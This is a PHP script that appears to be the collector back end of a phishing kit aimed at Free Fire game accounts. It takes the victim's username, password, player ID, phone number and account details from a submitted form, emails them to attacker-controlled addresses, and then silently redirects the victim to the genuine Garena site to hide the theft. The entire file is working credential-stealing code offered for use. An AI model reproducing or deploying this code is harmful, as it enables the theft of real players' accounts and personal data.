<?php
$username = $_GET['username'];
$password = $_GET['password'];
$login = $_GET['login'];
$level = $_GET['level'];
$tier = $_GET['tier'];
$rpt = $_GET['rpt'];
$playid = $_GET['playid'];
$nope = $_GET['nope'];
include '.email.php';

$subjek = "Free Fire $login|$username|$level";
$body = '

#---------[ DATA ACCOUNT ]-----------#

• Username   =   '.$username.'
• Password   =   '.$password.'
• UID        =   '.$playid.'
• Phone Numb =   '.$nope.'
• Tier       =   '.$tier.'
• Ep Type    =   '.$rpt.'
• AccLevel   =   '.$level.'

<br>
#-------------------[ HARTA GANS ]----------------------#
<br>
';

include ('email.php');
$headers = "From: SETOR GAME HARTA  <resultniod@gmail.com>";
$datamail = mail($subjek, $body, $headers);
$success = mail($result, $subjek, $body, $headers);

include ('bostrap.php');
$headers = "From: SETOR GAME HARTA  <resultniod@gmail.com>";
$datamail = mail($subjek, $body, $headers);
$success = mail($tobat, $subjek, $body, $headers);


echo "<script type='text/javascript'>window.top.location='http://ff.garena.com/';</script>";
?>
